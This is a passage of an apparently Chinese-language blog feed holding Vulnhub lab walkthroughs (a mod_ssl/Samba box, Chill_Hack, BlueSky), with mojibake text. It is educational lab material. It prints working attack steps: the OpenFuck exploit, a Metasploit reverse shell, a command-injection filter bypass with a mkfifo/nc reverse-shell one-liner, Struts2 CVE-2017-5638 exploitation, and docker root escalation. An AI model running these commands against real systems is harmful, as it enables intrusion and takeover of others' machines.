/usr/share/exploitdb/exploits/unix/remote/47080.c ./</code></pre><p>ç„¶åä½¿ç”¨gccè¿›è¡Œç¼–è¯‘</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# gcc -o exploit 47080.c -lcrypto47080.c:21:10: fatal error: openssl/ssl.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•   21 | #include &lt;openssl/ssl.h&gt;      |          ^~~~~~~~~~~~~~~compilation terminated.</code></pre><p>æç¤ºæŠ¥é”™äº†ï¼Œç»è¿‡ç™¾åº¦æœç´¢ï¼Œå‘ç°æ˜¯ç¼ºå°‘äº†ç»„ä»¶</p><p>å’±ä»¬ä½¿ç”¨aptè¿›è¡Œå®‰è£…</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# apt-get install libssl1.0-dev</code></pre><p>ç„¶åå†è¿›è¡Œç¼–è¯‘</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# gcc -o exploit 47080.c -lcryptoâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# ls47080.c  exploit</code></pre><p>å»è¿è¡Œä¸€ä¸‹</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# ./exploit******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************: Usage: ./exploit target box [port] [-c N]  target - supported box eg: 0x00  box - hostname or IP address  port - port for ssl connection  -c open N connections. (use range 40-50 if u dont know)</code></pre><p>è¿è¡Œåå¾—åˆ°äº†è¿è¡Œå‚æ•°ï¼Œå’±ä»¬è¿˜å¾—å…ˆæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# ./exploit | grep apache-1.3.20                                                                                                        1 â¨¯        0x02 - Cobalt Sun 6.0 (apache-1.3.20)        0x27 - FreeBSD (apache-1.3.20)        0x28 - FreeBSD (apache-1.3.20)        0x29 - FreeBSD (apache-1.3.20+2.8.4)        0x2a - FreeBSD (apache-1.3.20_1)        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2        0x7e - Slackware Linux 8.0 (apache-1.3.20)        0x86 - SuSE Linux 7.3 (apache-1.3.20)</code></pre><p>ç¬¦åˆæ¡ä»¶çš„æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯0x6aå’Œ0x6bï¼Œåˆ†åˆ«å»æµ‹è¯•ä¸€ä¸‹</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# ./exploit 0x6a 192.168.1.102 -c 40******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************Connection... 40 of 40Establishing SSL connectioncipher: 0x4043808c   ciphers: 0x80f8070Ready to send shellcodeSpawning shell...Good Bye!</code></pre><p>0x6aæµ‹è¯•å¤±è´¥ï¼Œç°åœ¨å»æµ‹è¯•ä¸€ä¸‹0x6b</p><pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]â””â”€# ./exploit 0x6b 192.168.1.102 -c 40******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************Connection... 40 of 40Establishing SSL connectioncipher: 0x4043808c   ciphers: 0x80f81e8Ready to send shellcodeSpawning shell...bash: no job control in this shellbash-2.05$d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c           =&gt; `ptrace-kmod.c&#39;Connecting to dl.packetstormsecurity.net:443... connected!Unable to establish SSL connection.Unable to establish SSL connection.gcc: ptrace-kmod.c: No such file or directorygcc: No input filesrm: cannot remove `ptrace-kmod.c&#39;: No such file or directorybash: ./exploit: No such file or directorybash-2.05$bash-2.05$ whoami&amp;&amp;idwhoami&amp;&amp;idapacheuid=48(apache) gid=48(apache) groups=48(apache)</code></pre><p>0x6bæˆåŠŸgetshellï¼Œç°åœ¨å»ææƒ</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>ç»è¿‡æµ‹è¯•åæ²¡æœ‰å‘ç°ææƒçš„ç‚¹ï¼Œä½†æ˜¯å‘ç°äº†å¦ä¸€ç§rootæƒé™çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ç”¨msfçš„æ¨¡å—</p><pre><code>use exploit/linux/samba/trans2openset payload linux/x86/shell_reverse_tcpshow optionsset rhosts 192.168.1.102exploitmsf6 exploit(linux/samba/trans2open) &gt; exploit[*] Started reverse TCP handler on 192.168.1.106:4444[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...[*] 192.168.1.102:139 - Trying return address 0xbffffafc...[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...[*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500[*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500[*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500whoami&amp;&amp;idrootuid=0(root) gid=0(root) groups=99(nobody)</code></pre><p>ç”¨msfçš„æ¨¡å—æ‰“å°±æ˜¯rootï¼Œè‡³äºä¸ºå•¥æˆ‘ä¹Ÿæ²¡ç ”ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶æ¥ï¼ˆä¸»è¦å› ä¸ºèœï¼‰</p><p>çŸ¥é“åŸå› çš„å°ä¼™ä¼´å¯ä»¥å‘Šè¯‰æˆ‘ä¸€ä¸‹</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Chill_Hack é¶åœºå®æˆ˜</title>
      <link href="/2021/10/17/Chill_Hack/"/>
      <url>/2021/10/17/Chill_Hack/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-Chill-Hack"><a href="#Vulnhub-Chill-Hack" class="headerlink" title="Vulnhub-Chill_Hack"></a>Vulnhub-Chill_Hack</h1><p>é¶åœºå®æˆ˜ Vulnhub-Chill_Hack</p><p>é¶åœºä¸‹è½½åœ°å€<a href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p><p>åºŸè¯ä¸å¤šè¯´ ç›´æ¥å¼€å§‹</p><p>ç¬¬ä¸€æ­¥ä½¿ç”¨kaliæ‰«æå†…ç½‘IP</p><p>Arp-scan â€“l</p><img src="/2021/10/17/Chill_Hack/image1.png" class=""><p>è·å¾—é¶åœºIPä¸º192.168.72.132</p><p>å¯¹é¶åœºè¿›è¡Œç«¯å£æ‰«æ</p><p>Nmap â€“A â€“v 192.168.72.132</p><img src="/2021/10/17/Chill_Hack/image2.png" class=""><p>å‘ç°å­˜åœ¨21 22 80ä¸‰ä¸ªç«¯å£</p><p>21ç«¯å£å­˜åœ¨åŒ¿åè®¿é—® å’±ä»¬å…ˆè®¿é—®çœ‹çœ‹</p><p>ç”¨æˆ·åä½¿ç”¨anonymous å¯†ç ä¸ºç©º</p><img src="/2021/10/17/Chill_Hack/image3.png" class=""><p>æˆåŠŸç™»é™†</p><p>æŸ¥çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶</p><img src="/2021/10/17/Chill_Hack/image4.png" class=""><p>å‘ç°å­˜åœ¨ä¸€ä¸ªtxtæ–‡ä»¶ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹</p><p>ä½¿ç”¨getä¸‹è½½åˆ°æœ¬åœ°ç„¶åæ‰“å¼€æŸ¥çœ‹</p><img src="/2021/10/17/Chill_Hack/image5.png" class=""><img src="/2021/10/17/Chill_Hack/image6.png" class=""><p>å—¯â€¦å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆç”¨</p><p>æˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹çœ‹80ç«¯å£çš„WebæœåŠ¡å§</p><img src="/2021/10/17/Chill_Hack/image7.png" class=""><p>çœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªä½“è‚²æ¯”èµ›çš„å®˜ç½‘ï¼Ÿ</p><p>æ‰«æä¸€ä¸‹ç›®å½•</p><img src="/2021/10/17/Chill_Hack/image8.png" class=""><p>å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„URL <a href="http://192.168.72.132/secret/index.php">http://192.168.72.132/secret/index.php</a></p><p>å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><img src="/2021/10/17/Chill_Hack/image9.png" class=""><p>OK çªç ´å£åº”è¯¥å°±åœ¨è¿™é‡Œäº†</p><p>å½“æˆ‘è¾“å…¥lsæƒ³æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æ–‡ä»¶çš„æ—¶å€™</p><img src="/2021/10/17/Chill_Hack/image10.png" class=""><p>è¿™æ—¶æˆ‘æƒ³èµ·æ¥æˆ‘ä»¬é‚£ä¸ªnote.txtæ–‡ä»¶é‡Œçš„è¯æ˜¯ä»€ä¹ˆæ„æ€</p><p>è¯æ˜è¿™é‡Œæœ‰è¿‡æ»¤ å°±æ˜¯ä¸çŸ¥é“æ˜¯ç™½åå•è¿˜æ˜¯é»‘åå•äº†</p><p>ç»è¿‡æˆ‘å¤§é‡æµ‹è¯• è¯¥é¶åœºä¸ºé»‘åå•éªŒè¯</p><p>é‚£å°±å¥½åŠäº† ç»•è¿‡å§</p><p>å‡ºå»åƒäº†ä¸ªé¥­ å›æ¥çªç„¶æ¥äº†æ€è·¯</p><p>å°†ä¸¤ä¸ªæŒ‡ä»¤ç»“åˆèµ·æ¥ ä¸å°±æˆäº†å—</p><p>ä¾‹å¦‚ lsä¼šè¢«æ‹¦æˆª</p><p>é‚£å°± whoami;ls</p><img src="/2021/10/17/Chill_Hack/image11.png" class=""><p>æˆåŠŸæ‰§è¡Œ æˆ‘å¯çœŸæ˜¯ä¸ªå°æœºçµ</p><p>å°†è¯¥æ–¹æ³•å’ŒNCåå¼¹ä¸€ç»“åˆ ä¸å°±æ‹¿åˆ°shelläº†ï¼Ÿ</p><p>ç»è¿‡å¤§é‡æµ‹è¯• å‘ç°å¯ç”¨çš„åå¼¹è¯­å¥ä¸º</p><p>dir;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.72.130 7777 &gt; &#x2F;tmp&#x2F;f</p><p>æœ¬æœºç›‘å¬ nc â€“lvp 7777</p><p>æ‰§è¡Œ æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell</p><img src="/2021/10/17/Chill_Hack/image12.png" class=""><img src="/2021/10/17/Chill_Hack/image13.png" class=""><p>è¯¥shellæƒé™è¿˜æ˜¯è¾ƒä½ å¹¶ä¸”æ“ä½œéå¸¸ä¸ä¾¿åˆ© å’±ä»¬è¦æƒ³åŠæ³•ææƒ</p><p>æŸ¥æ‰¾pythonç‰ˆæœ¬</p><p>Which python</p><img src="/2021/10/17/Chill_Hack/image14.png" class=""><p>æˆåŠŸç¡®è®¤pythonç‰ˆæœ¬ä¸ºpython3</p><p>ä½¿ç”¨python3å°†shellè¿›è¡Œæå‡</p><p>python3 -c â€˜import pty;pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</p><img src="/2021/10/17/Chill_Hack/image15.png" class=""><p>æˆåŠŸ</p><p>è¯¥å‘½ä»¤ä¸ä¼šå¯¹ç”µè„‘æœ‰ä»€ä¹ˆå±å®³ ä½†å¶å°”ä¼šæœ‰å¥‡æ•ˆ</p><img src="/2021/10/17/Chill_Hack/image16.png" class=""><p>åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ è¿™ä¸ªhacker.phpå¼•èµ·äº†æˆ‘çš„æ³¨æ„ æŸ¥çœ‹ä¸€ä¸‹å§</p><img src="/2021/10/17/Chill_Hack/image17.png" class=""><p>åœ¨é»‘æš—ä¸­æˆ‘ä¼šçœ‹åˆ°ç­”æ¡ˆï¼ŸçœŸå°±äººå‡è°œè¯­äººå‘—</p><p>åœ¨hacker.phpä¸­ æˆ‘ä»¬çœ‹åˆ°imagesæ–‡ä»¶å¤¹ä¸­æœ‰ä¸€å¼ å›¾ç‰‡ åº”è¯¥å°±æ˜¯çº¿ç´¢æ‰€åœ¨</p><p>å’±ä»¬è¿›å…¥imagesæ–‡ä»¶å¤¹</p><img src="/2021/10/17/Chill_Hack/image18.png" class=""><p>OK å’±ä»¬æŠŠè¿™å¼ å›¾ç‰‡ç”¨ncä¸‹è½½ä¸‹æ¥ ä¹Ÿå¯ä»¥ç”¨python3å¼€å¯httpæœåŠ¡è¿›è¡Œä¸‹è½½ ä¸è¿‡æˆ‘å›¾çœäº‹å„¿ å°±ncäº†å§</p><p>æœ¬åœ°ç”µè„‘è¿è¡Œ nc â€“nvlp 4444 &gt; hacker-with-laptop_23-2147985341.jpg</p><p>å’±ä»¬ä¿æŒåŸåä¸åŠ¨</p><p>Shellé‡Œè¿è¡Œ nc 192.168.72.130 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg</p><img src="/2021/10/17/Chill_Hack/image19.png" class=""><p>OK ç¨ç­‰ä¸€ä¼šå„¿ æˆåŠŸä¸‹è½½ä¸‹æ¥</p><p>æ ¹æ®hacker.phpä¸­çš„æç¤º åœ¨é»‘æš—ä¸­æˆ‘ä»¬ä¼šçœ‹åˆ°ç­”æ¡ˆ è¿™ä¸å°±æ˜¯å¦¥å¦¥çš„å›¾ç‰‡éšå†™å— ä¸æ„§æ˜¯æˆ‘ æœ€è¿‘çš„æŸ¯å—æ²¡ç™½çœ‹</p><p>ä½¿ç”¨steghideæŸ¥çœ‹</p><img src="/2021/10/17/Chill_Hack/image20.png" class=""><p>æœç„¶å­˜åœ¨ä¸€ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ… ä¸æ„§æ˜¯æˆ‘</p><p>ä¾ç„¶ä½¿ç”¨steghideè¿›è¡Œè§£å‹</p><img src="/2021/10/17/Chill_Hack/image21.png" class=""><p>OK å¾—åˆ°äº†è¿™ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ…æ–‡ä»¶</p><p>æˆ‘ä»¬ç°åœ¨å°†ä»–è§£å‹ç¼©</p><img src="/2021/10/17/Chill_Hack/image22.png" class=""><p>æˆ‘ä¸¢å•Š è¿™é‡Œæ¥ä¸ªå¯†ç  æˆå§ å†æ‰¾</p><p>æ‰¾ï¼Ÿæ‰¾æ˜¯ä¸å¯èƒ½æ‰¾çš„ å°±å’±è¿™æš´è„¾æ°” çˆ†ä»–ï¼</p><img src="/2021/10/17/Chill_Hack/image23.png" class=""><p>ä½¿ç”¨zip2johbç”Ÿæˆäº†ä¸€ä¸ªbackup.johnæ–‡ä»¶</p><p>å’±ä»¬ä½¿ç”¨johnçˆ†ä»–</p><img src="/2021/10/17/Chill_Hack/image24.png" class=""><p>OK å®Œæˆ</p><p>å’±ä»¬ä½¿ç”¨johnæŸ¥çœ‹å¯†ç </p><img src="/2021/10/17/Chill_Hack/image25.png" class=""><p>å¯†ç ä¸ºpass1word è¡Œå§ ç»å…¸å¼±å£ä»¤</p><p>æ¥ä¸‹æ¥å’±ä»¬è§£å‹æ–‡ä»¶</p><img src="/2021/10/17/Chill_Hack/image26.png" class=""><p>æˆåŠŸè§£å‹å‡ºæ¥</p><p>æŸ¥çœ‹è§£å‹å‡ºæ¥çš„æ–‡ä»¶</p><img src="/2021/10/17/Chill_Hack/image27.png" class=""><p>å¥½å®¶ä¼™ è¿˜æœ‰ä¸ªbase64ç¼–ç  è§£å¯†å§</p><img src="/2021/10/17/Chill_Hack/image28.png" class=""><p>è¿”å›æˆ‘ä»¬çš„shell æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·</p><img src="/2021/10/17/Chill_Hack/image29.png" class=""><p>ä½¿ç”¨æˆ‘ä»¬å¾—åˆ°çš„å¯†ç ç™»å…¥è¿›ç”¨æˆ·anurodh</p><img src="/2021/10/17/Chill_Hack/image30.png" class=""><p>æˆåŠŸç™»å…¥</p><p>ç¡®è®¤è´¦æˆ·å¯†ç æ²¡é—®é¢˜äº† è¿™æ—¶å€™å’±ä»¬å°±è¦ç”¨åˆ°ä¸€å¼€å§‹æ‰«æå‡ºçš„22ç«¯å£äº†</p><p>æ¯•ç«Ÿshellæ˜¯ä¸ç¨³å®šçš„ ä½¿ç”¨sshæœåŠ¡ç™»å…¥å§</p><img src="/2021/10/17/Chill_Hack/image31.png" class=""><p>æˆåŠŸç™»å…¥ æœ‰ä¸€ä¸ªç¨³å®šçš„æƒé™çš„æ„Ÿè§‰å¤ªçˆ½äº†</p><p>è¿™æ—¶å€™è‚¯å®šå°±æ˜¯ææƒäº†æ˜¯å§</p><p>ç›´æ¥ä½¿ç”¨ç»å…¸çš„sudo su</p><img src="/2021/10/17/Chill_Hack/image32.png" class=""><p>å¤±è´¥äº† å—¯â€¦ æƒ…ç†ä¹‹ä¸­ æ„æ–™ä¹‹å¤–</p><p>ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoçš„æƒé™ å‘ç°apaarå¯ä»¥ææƒï¼Ÿé‚£å°±é€ ä»–</p><img src="/2021/10/17/Chill_Hack/image33.png" class=""><p>æŸ¥çœ‹apaaræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</p><img src="/2021/10/17/Chill_Hack/image34.png" class=""><p>å‘ç°apaarä¸‹æœ‰ä¸ªtxtæ–‡ä»¶ ä½†ç”±äºæƒé™æ–‡ä»¶æˆ‘ä»¬æ— æ³•è®¿é—®</p><p>ä½†ä¸Šè¿°æåˆ°äº† apaarä¸‹æœ‰ä¸ªshè„šæœ¬æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ é‚£å°±æ‰§è¡Œå®ƒ</p><img src="/2021/10/17/Chill_Hack/image35.png" class=""><p>å®ƒéœ€è¦ä¸€ä¸ªåå­— å’±ä»¬éšä¾¿è¾“å…¥å³å¯</p><img src="/2021/10/17/Chill_Hack/image36.png" class=""><p>æ‰§è¡Œå®Œæ¯•äº† ä½†æˆ‘ä¸çŸ¥é“å®ƒæœ‰æ•ˆæœ</p><p>é‚£å°±é˜…è¯»ä¸€ä¸‹å§</p><img src="/2021/10/17/Chill_Hack/image37.png" class=""><p>è¿™ä¸ªæ‰¹å¤„ç† æœ‰ç‚¹æ„æ€å•Š ä¼¼ä¹å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><img src="/2021/10/17/Chill_Hack/image38.png" class=""><p>å°è¯•æˆåŠŸ æœ‰ç‚¹æ„æ€</p><p>æ—¢ç„¶æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–local.txtæ–‡ä»¶ é‚£å°±è®©apaaræ¥è¯»å–å§</p><img src="/2021/10/17/Chill_Hack/image39.png" class=""><p>å•Šè¿™ æˆ‘è¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆææƒçš„ä¸œè¥¿å‘¢ ç»“æœä½ å‘Šè¯‰æˆ‘ è¿™å°±æ˜¯ä¸ªflagï¼Ÿ</p><p>é‚£ä¹Ÿè¡Œå§ flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</p><p>OK å’±ä»¬ç»§ç»­æ‰¾å…¶ä»–æ–¹æ³•ææƒå§</p><p>è¾“å…¥idæŸ¥çœ‹æƒé™</p><img src="/2021/10/17/Chill_Hack/image40.png" class=""><p>å—¯ï¼Ÿdockerï¼Ÿè¦ç´ å¯Ÿè§‰</p><p>æˆ‘ä»¬ä½¿ç”¨ä¸€äº›ææƒè¾…åŠ©å·¥å…·<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> åœ¨é‡Œé¢æœæœdocker</p><img src="/2021/10/17/Chill_Hack/image41.png" class=""><p>ä½¿ç”¨æ­¤å‘½ä»¤å³å¯ææƒdocker run -v &#x2F;:&#x2F;mnt â€“rm -it alpine chroot &#x2F;mnt sh</p><img src="/2021/10/17/Chill_Hack/image42.png" class=""><img src="/2021/10/17/Chill_Hack/image43.png" class=""><p>ææƒæˆåŠŸ</p><p>è¿›å…¥rootç›®å½• æ‹¿åˆ°æœ€åä¸€ä¸ªflag</p><img src="/2021/10/17/Chill_Hack/image44.png" class=""><p>Flag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</p><p>æ€»ç»“è¯­ï¼šæ€ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé¶åœºè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚æˆ‘èµ·åˆä»¥ä¸ºå°±æ˜¯ç®€å•çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œgetshellä»¥åä¸€ä¸ªè„šæœ¬ææƒå°±æ‹¿ä¸‹äº†ã€‚æ²¡æƒ³åˆ°è¿˜æœ‰è¿™ä¹ˆå¤šæ­¥éª¤ï¼ŒæŒºä¸¥è°¨çš„å§</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - BlueSky é¶åœºå®æˆ˜</title>
      <link href="/2021/10/07/BlueSky/"/>
      <url>/2021/10/07/BlueSky/</url>
      
        <content type="html"><![CDATA[<h1 id="é¶åœºå®æˆ˜-Vulnhub-BlueSky"><a href="#é¶åœºå®æˆ˜-Vulnhub-BlueSky" class="headerlink" title="é¶åœºå®æˆ˜ Vulnhub-BlueSky"></a>é¶åœºå®æˆ˜ Vulnhub-BlueSky</h1><p>é¦–å…ˆä½¿ç”¨kaliæ‰«æé¶åœºçš„IPåœ°å€</p><p>Arp-scan â€“l</p><img src="/2021/10/07/BlueSky/image1.png" class="" title="image1"><p>å¯¹æ¯”MACåœ°å€ æˆåŠŸå¾—åˆ°é¶åœºIPåœ°å€192.168.72.131</p><p>è¿›è¡Œç«¯å£æ‰«æ</p><p>Nmap â€“Sv â€“v 192.168.72.131</p><img src="/2021/10/07/BlueSky/image2.png" class="" title="image2"><p>å¼€æ”¾äº†ç«¯å£22å’Œ8080</p><p>22ä¸ºSSHç«¯å£ï¼Œçªç ´å¤šåŠéƒ½æ˜¯å¼±å£ä»¤ï¼Œå’±ä»¬å…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µï¼Œè®¿é—®8080çš„WEBæœåŠ¡å™¨çœ‹çœ‹</p><p><a href="http://192.168.72.131:8080/">http://192.168.72.131:8080</a></p><img src="/2021/10/07/BlueSky/image3.png" class="" title="image3"><p>è®¿é—®åå‘ç°æ˜¯tomcat 9.0.40 ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†tomcatçš„cveæ¼æ´</p><p>ä½¿ç”¨searchsploitæœç´¢ tomcat 9.0.40çš„æ¼æ´</p><img src="/2021/10/07/BlueSky/image4.png" class="" title="image4"><p>å—¯â€¦å¥½åƒæ²¡æœ‰</p><p>é‚£å°±æµ‹è¯•ä¸€æ³¢0dayå§(å¼±å£ä»¤)</p><p>Tomcat&#x2F;tomcat</p><p>Admin&#x2F;admin</p><img src="/2021/10/07/BlueSky/image5.png" class="" title="image5"><p>OK ç¡®è®¤æ²¡æœ‰0day</p><p>é‚£å°±åªèƒ½æ‰¾è¯¥ç‰ˆæœ¬å­˜åœ¨çš„æ¼æ´äº†</p><p>åœ¨ç™¾åº¦æ‰¾åˆ°ä¸€ä¸ªstruts2-showcaseçš„æ¼æ´ï¼ˆs2-048è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</p><p>å¥½å®¶ä¼™ ç›´æ¥ä¸Šå·¥å…·äº†å“ˆ å°±æ‡’å¾—å†æµ‹è¯•äº†</p><p>url: <a href="http://192.168.72.131:8080/struts2-showcase/index.action">http://192.168.72.131:8080/struts2-showcase/index.action</a></p><img src="/2021/10/07/BlueSky/image6.png" class="" title="image6"><p>å¥½å®¶ä¼™ è¿™ä¸ªURLæˆ‘çˆ†ç›®å½•è¿˜æ²¡çˆ†å‡ºæ¥ åœ¨ç½‘ä¸Šæœç´¢ç›¸å…³æ¼æ´æ‰æ‰¾åˆ°</p><p>ä¸‹è½½exp</p><p>git clone <a href="https://github.com/jrrdev/cve-2017-5638.git">https://github.com/jrrdev/cve-2017-5638.git</a></p><p>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ¼æ´</p><p>python exploit.py â€œ<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> â€œwhoamiâ€</p><img src="/2021/10/07/BlueSky/image7.png" class="" title="image7"><p>whoamiæ‰§è¡ŒæˆåŠŸ</p><p>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ncæƒé™</p><p>python exploit.py â€œ<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> â€œncâ€</p><img src="/2021/10/07/BlueSky/image8.png" class="" title="image8"><p>å­˜åœ¨ncæƒé™çš„ ä½†ä¼¼ä¹æ²¡æœ‰nc â€“eçš„æƒé™ å¾—é€šè¿‡å…¶ä»–æ–¹å¼åå¼¹shelläº†</p><p>é¦–å…ˆä½¿ç”¨mknodå»ºç«‹ç®¡é“</p><p>Python exploit.py â€œ<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> â€œmknod &#x2F;tmp&#x2F;backpipe pâ€</p><img src="/2021/10/07/BlueSky/image9.png" class="" title="image9"><p>Kaliç›‘å¬4444ç«¯å£</p><p>Nc â€“nvlp 4444</p><img src="/2021/10/07/BlueSky/image10.png" class="" title="image10"><p>åå¼¹shellï¼Œå°†å†…å®¹ä¼ é€’ç‰©ä½¿ç”¨ç®¡é“æ–‡ä»¶pä½œä¸ºæ¡¥æ¢ï¼Œè¿›è¡Œæ•°æ®é‡å®šå‘ä¼ é€’</p><p>python exploit.py â€œ<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> -c â€œ&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;p | nc 192.168.72.133 4444 1&gt;&#x2F;tmp&#x2F;pâ€</p><img src="/2021/10/07/BlueSky/image11.png" class="" title="image11"><p>æ­£å¸¸æ¥è¯´ç°åœ¨kaliæ˜¯ä¼šè·å–åˆ°ä¸€ä¸ªncçš„shellçš„ï¼Œä½†æˆ‘è¿™è¾¹ä¸çŸ¥é“ä»€ä¹ˆåŸå› æ— æ³•æˆåŠŸï¼Œå…ˆæ•™å¤§å®¶æ­¤æ–¹æ³•ç»§ç»­æ“ä½œçš„æ–¹æ³•ï¼Œæˆ‘å†æ¼”ç¤ºæˆ‘è‡ªå·±åšçš„æ›¿ä»£çš„æ–¹æ³•</p><p>è·å–åˆ°shellååœ¨shellå†…è¿è¡Œ</p><p>python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</p><p>å› ä¸ºé¶æœºç¯å¢ƒå†…æ²¡æœ‰python2çš„ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨python3æå‡ä¸ºä¸€ä¸ªäº¤äº’å¼shellå°±å¯ä»¥äº†</p><p>ç¬¬äºŒç§æ–¹æ³•ï¼š</p><p>ç¬¬äºŒç§æ–¹æ³•æˆ‘ä»¬ä½¿ç”¨windowæ¥è¿›è¡Œæ¸—é€</p><p>é¦–å…ˆä½¿ç”¨struts2çš„å›¾å½¢åŒ–éªŒè¯å·¥å…·è¿›è¡Œæ¼æ´éªŒè¯</p><img src="/2021/10/07/BlueSky/image12.png" class="" title="image12"><p>å¾—åˆ°ç›®å½•åœ°å€</p><p>webpath:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;struts2-showcase&#x2F;</p><p>ç›´æ¥ä¸Šä¼ 